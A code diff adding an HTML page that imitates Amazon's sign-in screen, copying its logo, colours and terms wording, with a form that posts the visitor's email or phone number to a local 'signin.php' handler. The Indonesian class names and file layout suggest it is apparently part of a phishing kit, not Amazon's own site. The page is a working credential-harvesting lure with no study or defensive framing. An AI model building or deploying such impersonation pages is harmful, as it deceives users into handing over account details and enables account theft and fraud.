@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon — Sign In</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 10px 0 25px; }
+        .logo img { height: 40px; }
+        .kotak { width: 100%; max-width: 340px; border: 1px solid #ddd; border-radius: 4px; padding: 20px; }
+        h1 { font-size: 28px; margin-bottom: 20px; font-weight: 400; }
+        label { font-size: 13px; font-weight: 700; }
+        input { width: 100%; padding: 7px; margin: 6px 0 15px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 15px; }
+        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 3px rgba(0,113,133,.5); }
+        .tombol { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 15px; cursor: pointer; }
+        .tombol:hover { background: #F7CA00; }
+        .salah { color: #d00; font-size: 13px; margin-bottom: 12px; display: none; }
+        .garis { height: 1px; background: #e7e7e7; margin: 25px 0; }
+    </style>
+</head>
+<body>
+
+<div class="logo">
+    <a href="amazon.html"><img src="../assets/img/amazonlogo.png" alt="Amazon"></a>
+</div>
+
+<div class="kotak">
+    <h1>Sign In</h1>
+
+    <div class="salah" id="pesanSalah">Enter your email address</div>
+
+    <form action="../action/signin.php" method="POST" id="formEmail">
+        <label for="email">Email or mobile phone number</label>
+        <input type="text" id="email" name="email" required>
+
+        <button type="submit" class="tombol">Continue</button>
+    </form>
+
+    <div class="garis"></div>
+
+    <p style="font-size:12px;line-height:1.5">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
+</div>
+
+<script>
+if (location.search.includes('error=email')) {
+    document.getElementById('pesanSalah').style.display = 'block';
+    document.getElementById('email').style.borderColor = '#d00';
+}
+</script>
+
+</body>
+</html>
